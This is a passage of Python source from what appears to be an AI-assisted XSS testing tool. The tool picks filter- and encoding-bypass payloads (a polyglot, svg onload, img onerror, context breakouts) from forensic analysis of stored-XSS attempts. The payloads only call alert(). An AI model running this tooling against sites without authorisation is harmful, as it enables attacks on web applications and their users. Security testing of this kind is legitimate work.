            elif 'event' in suggestion.lower():
                return bypasses[3]  # Event handler

        return bypasses[0]  # Default to attribute-based

    def _apply_encoding_bypasses(self, payload, suggestions):
        """Apply encoding bypass techniques"""
        import urllib.parse

        bypasses = [
            # Double URL encoding
            urllib.parse.quote(urllib.parse.quote(payload)),
            # Unicode normalization
            payload.replace('<', '\\u003C').replace('>', '\\u003E'),
            # Hex encoding
            payload.replace('<', '&#x3C;').replace('>', '&#x3E;'),
            # Mixed encoding
            payload.replace('<script', '%3Cscript').replace('</script>', '%3C/script%3E')
        ]

        for suggestion in suggestions:
            if 'double' in suggestion.lower():
                return bypasses[0]
            elif 'unicode' in suggestion.lower():
                return bypasses[1]
            elif 'hex' in suggestion.lower():
                return bypasses[2]

        return bypasses[3]  # Default to mixed encoding

    def _apply_filter_bypasses(self, payload, suggestions):
        """Apply filter bypass techniques"""
        bypasses = [
            # Polyglot payloads for multiple contexts
            f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
            # CSS-based vectors
            f'<style>body{{background:url("javascript:alert(1)")}}</style>',
            # SVG-based vectors
            f'<svg><script>alert(1)</script></svg>',
            # Alternative script tags
            f'<script type="text/vbscript">alert(1)</script>',
            # Event handler variations
            f'<img/src=x onerror=alert(1)>',
        ]

        for suggestion in suggestions:
            if 'polyglot' in suggestion.lower():
                return bypasses[0]
            elif 'css' in suggestion.lower():
                return bypasses[1]
            elif 'svg' in suggestion.lower():
                return bypasses[2]

        return bypasses[4]  # Default to event handler

    def _apply_parameter_bypasses(self, payload, suggestions):
        """Apply parameter bypass techniques"""
        # These are more about changing injection approach than payload
        # For now, try different payload structures
        bypasses = [
            # Try breaking out of existing context first
            f'"; {payload}; //',
            f'\'; {payload}; //',
            # Try different script structures
            f'<script>/**/alert(1)/***/</script>',
            # Try timing-based approach
            f'<img src=x onerror=setTimeout("alert(1)",100)>',
        ]

        for suggestion in suggestions:
            if 'timing' in suggestion.lower():
                return bypasses[3]
            elif 'context' in suggestion.lower():
                return bypasses[0]

        return bypasses[2]  # Default to script variation

    async def _create_stored_xss_context(self, form):
        """Create a vulnerability context for stored XSS testing"""
        from .models import VulnerabilityContext, NucleiResult

        # Create a synthetic nuclei result for stored XSS context
        synthetic_nuclei = NucleiResult(
            template_id="stored-xss-form",
            template_name=f"Stored XSS Form Testing - {form.form_id}",
            matched_url=form.action_url,
            severity="high",
            description=f"Testing stored XSS vulnerability in form {form.form_id}",
            injection_point=None,
            raw_data={
                "form_id": form.form_id,
                "fields": [field.name for field in form.fields],
                "method": form.method,
                "context_type": "stored_xss_form"
            }
        )

        return VulnerabilityContext(
            nuclei_result=synthetic_nuclei,
            attempt_history=[],
            current_attempt=0,
            max_attempts=5
        )

    async def _analyze_stored_attempt_forensics(self, attempt, target_url):
        """Perform forensic analysis on a stored XSS attempt"""
        if not self.forensic_parser:
            return None

        try:
            # Create temporary attempt metadata for forensic analysis
            attempt_data = {
                'attempt_id': f"stored_{attempt.attempt:03d}",
                'vulnerability_id': 'stored_xss_analysis',
                'cid': datetime.now().strftime("%Y%m%d_%H%M%S"),
                'url': target_url,
                'method': 'POST',
                'payload': attempt.payload,
                'submitted_payload': attempt.payload,
                'timestamp': attempt.timestamp
            }

            # Look for recent HAR files from proxy captures
            har_paths = []
            proxy_captures_dir = Path("./proxy_captures")
            if proxy_captures_dir.exists():
                recent_har_files = sorted(proxy_captures_dir.glob("*.har"),
                                        key=lambda x: x.stat().st_mtime, reverse=True)[:2]
                har_paths = [str(p) for p in recent_har_files]

            # Check for stored XSS response content
            html_paths = []
            if hasattr(attempt, 'stored_xss_response') and attempt.stored_xss_response:
                if hasattr(attempt.stored_xss_response.verification_result, 'page_content') and attempt.stored_xss_response.verification_result.page_content:
                    # Save temporary HTML capture for analysis
                    temp_html = Path(f"./temp_stored_forensic_{attempt.attempt}.html")
                    with open(temp_html, 'w', encoding='utf-8') as f:
                        f.write(attempt.stored_xss_response.verification_result.page_content)
                    html_paths = [str(temp_html)]

            # Perform forensic analysis
            if har_paths or html_paths:
                finding = self.forensic_parser.analyze_attempt_data(
                    attempt_data, har_paths, html_paths
                )

                if finding and hasattr(finding, 'difference_summary'):
                    return {
                        'fate': finding.difference_summary,
                        'confidence': finding.confidence_score,
                        'suggestions': finding.ai_analysis.get('bypass_suggestions', []) if finding.ai_analysis else [],
                        'transformation_type': finding.ai_analysis.get('transformation_type') if finding.ai_analysis else None,
                        'encoding_method': finding.ai_analysis.get('encoding_method') if finding.ai_analysis else None
                    }

            return None

        except Exception as e:
            self.logger.warning(f"Stored XSS forensic analysis failed: {e}")
            return None

        finally:
            # Clean up temporary files
            for i in range(1, 6):  # Max 5 attempts
                temp_html = Path(f"./temp_stored_forensic_{i}.html")
                if temp_html.exists():
                    temp_html.unlink()

    async def _improve_stored_payload_with_forensics(self, stored_context, last_attempt, forensic_context):
        """Improve stored XSS payload using forensic intelligence"""
        try:
            # Create a synthetic VerificationResult for compatibility
            from .models import VerificationResult

            synthetic_result = VerificationResult(
                url=stored_context.nuclei_result.matched_url,
                payload=last_attempt.payload if hasattr(last_attempt, 'payload') else "",
                executed=False,
                reflection_found=False,
                error="",
                timestamp=datetime.now().strftime("%Y%m%d_%H%M%S")
            )

            # Use the existing forensic-enhanced improvement method
            enhanced_attempt = await self._improve_payload_with_forensics(
                stored_context, synthetic_result, forensic_context
            )

            # Ensure the attempt has stored XSS specific properties
            enhanced_attempt.timestamp = datetime.now().isoformat()

            return enhanced_attempt

        except Exception as e:
            self.logger.error(f"Forensic-enhanced stored payload improvement failed: {e}")
            # Fallback to basic improvement
            return await self.payload_agent.improve_stored_payload(stored_context, last_attempt)